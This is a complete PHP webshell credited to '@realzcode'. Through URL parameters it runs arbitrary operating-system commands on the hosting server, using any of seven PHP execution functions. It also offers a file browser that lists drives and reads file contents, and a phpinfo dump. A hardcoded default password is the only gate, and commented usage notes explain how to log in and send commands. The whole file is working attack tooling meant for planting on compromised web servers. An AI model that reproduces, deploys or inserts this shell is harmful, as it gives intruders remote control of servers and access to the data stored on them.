<?php
/* PHP Webshell
 * ------------
 * By @realzcode
 */
$p = "password";
session_start();
if (isset($_SESSION["p"])) {
    if ($_SESSION["p"] !== $p) {
        echo "* ------------------------- *\n";
        echo "* PHP Webshell by Realzcode *\n";
        echo "* ------------------------- *\n";
        echo "# Locked!";
        if (@$_GET["p"] !== $p) {
            exit;
        }
    }
} else {
    unset($_SESSION["p"]);
}
$x = urldecode(@$_GET["x"]);
$w = strtolower(substr(PHP_OS, 0, 3)) === "win";
$s = $w ? '\\' : '/';
if (strpos($x, "cd ") !== false) {
    if ($w) {
        $_SESSION["d"] = str_replace("\\", "/", realpath(substr($x, 3)));
    } else {
        $_SESSION["d"] = realpath(substr($x, 3));
    }
} else {
    if (empty($_SESSION["d"])) {
        $_SESSION["d"] = getcwd();
    }
}
chdir($_SESSION["d"]);
$x = escapeshellcmd($x) . " 2>&1";
switch (@$_GET["m"]) {
    case "r":
        echo `$x`;
        break;
    case "e":
        echo system($x);
        break;
    case "a":
        $y = null;
        $z = null;
        exec($x, $y, $z);
        foreach ($y as $k => $v) {
            echo $v . "\n";
        }
        break;
    case "l":
        echo shell_exec($x);
        break;
    case "z":
        echo passthru($x);
        break;
    case "c":
        $v = [
            0 => ["pipe", "r"],
            1 => ["pipe", "w"],
            2 => ["file", "php://temp", "a"],
        ];
        $y = proc_open($x, $v, $z);
        if (is_resource($y)) {
            fclose($z[0]);
            while (!feof($z[1])) {
                echo fgets($z[1], 1024);
            }
            fclose($z[1]);
            $c = proc_close($y);
        }
        break;
    case "o":
        $v = popen($x, "r");
        $y = fread($v, 2096);
        echo $y;
        pclose($v);
        break;
    case "d":
        echo '<a href="?m=exp" style="background:var(--php-dark-grey);color:#777;">Explorer</a>';
        echo phpinfo();
        break;
    case "x":
        $_SESSION["p"] = @$_GET["p"];
        break;
    case "exp":

        echo '<style>
        html{
            font-family:consolas;
            font-size:13px;
            background:#111;
            color:#777
        }
        table{
            font-size:13px;
            margin:13px 0;
        }
        a{
            color:#777;
            text-decoration:none;
        }
        a:hover{
            color:#eee;
        }
        textarea{
            width:100%;
            height:50%;
            background:#111;
            color:#777;
            margin:13px 0;
        }
        th, td{
            border:1px dashed #777;
            padding:3px;
            margin:0;
        }
        .tcenter {
            text-align:center;
            cursor:pointer;
        }
        .tright {
            text-align:right;
            cursor:pointer;
        }
        </style>';

        echo '<a href="?m=exp&c">Home</a> | ';
        echo '<a href="?m=d">Info</a> | ';

        $_SESSION["d"] = isset($_GET['x']) ? $_GET['x'] : getcwd();

        for ($i=65; $i < 91; $i++) {
            if (is_readable(chr($i) . ':')){
                echo '<a href="?m=exp&x=' . chr($i) . ':' . '">' . chr($i) . '</a> | ';
            }
        }

        if (isset($_GET['c'])) 
        {
            unset($_SESSION["d"]);
            header('Location:' . $_SERVER['PHP_SELF'] . '?m=exp');
        } 
        else if (isset($_GET['z'])) 
        {
            echo '<a href="?m=exp&x=' . $_SESSION["d"] . '">Back</a>';
            $x = $_GET['z'];
            $y = fopen($x, "r");
            $z = 0;
            if (filesize($x) > 0) 
            {
                $z = fread($y, filesize($x));
            }
            fclose($y);
            if (filesize($x) < 2000000) // 2MB
            {
                echo '<br><textarea>' . htmlentities($z) . '</textarea><br>';
            } else {
                echo '<br>File to large than 2MB<br>';
            }
            echo formatFileSize(filesize($x));
        } 
        else 
        {
            if (is_readable($_SESSION["d"]))
            {
                echo '<a href="?m=exp&x=' . $_SESSION["d"] . '">' . $_SESSION["d"]  . '</a>';

                $items = scandir($_SESSION["d"]);

                $directories = [];
                $files = [];

                foreach ($items as $item) {
                    $path = $_SESSION["d"] . $s . $item;
                    if (is_dir($path)) {
                        $directories[] = $item;
                    } else {
                        $files[] = $item;
                    }
                }

                echo '<table>';
                echo '<thead><tr><th>Filename</th><th>Size</th><th>Perms</th></tr><tbody>';

                sort($directories);
                foreach ($directories as $directory) {
                    $path_dir = $_SESSION["d"] . $s . $directory;
                    echo '<tr>';
                    echo '<td title="' . $path_dir . '">&#128193; <a href="?m=exp&x=' . $path_dir . '">' . $directory . '</a></td>';
                    echo '<td class="tcenter" title="' .  date("Y/m/d H:i:s", @filemtime($path_dir)) . '">-</td>';
                    echo '<td class="tcenter" title=":p">' . substr(sprintf('%o', @fileperms($path_dir)), -4) . '</td>';
                    echo '</tr>';
                }

                if(!is_null($files))
                {
                    sort($files);
                    foreach ($files as $file) {
                        $path_file = $_SESSION["d"] . $s . $file;
                        echo '<tr>';
                        echo '<td title="' . $path_file . '">&#128196; <a href="?m=exp&z=' . $path_file .  '">' . $file . '</a></td>';
                        echo '<td class="tright" title="' . date("Y/m/d H:i:s", @filemtime($path_file)) . '">' . formatFileSize(@filesize($path_file));
                        echo '<td class="tcenter" title=":p">' . substr(sprintf('%o', @fileperms($path_file)), -4) . '</td>';
                        echo '</tr>';
                    }
                }

                echo '</tbody></table>';
            }
        }
        break;

    default:
    
        // echo "* ------------------------- *\n";
        // echo "* PHP Webshell by Realzcode *\n";
        // echo "* ------------------------- *\n";
        // echo "# Better [view-source:http://domain.com/webshell.php]\n";
        // echo "# Login  [?m=x&p={password}]\n";
        // echo "# Uri    [?m=r&x={command}]\n";
        // echo "# Chdir  {cd dir}\n";
        // echo "# Terminal Modes :\n";
        // echo "0 .  [m=r] backtick\n";
        // echo "1 .  [m=e] system\n";
        // echo "2 .  [m=a] exec\n";
        // echo "3 .  [m=l] shell_exec\n";
        // echo "4 .  [m=z] passthru\n";
        // echo "5 .  [m=c] proc_open\n";
        // echo "6 .  [m=o] popen\n";
        // echo "7 .  [m=d] phpinfo\n";
        // echo "8 .  [m=exp] Explorer";
        break;
}

function formatFileSize($bytes) {
    $units = array('B', 'KB', 'MB', 'GB', 'TB');
    $i = 0; while ($bytes >= 1024 && $i < count($units) - 1) { $bytes /= 1024; $i++; }
    return round($bytes, 2) . ' ' . $units[$i];
}
?>
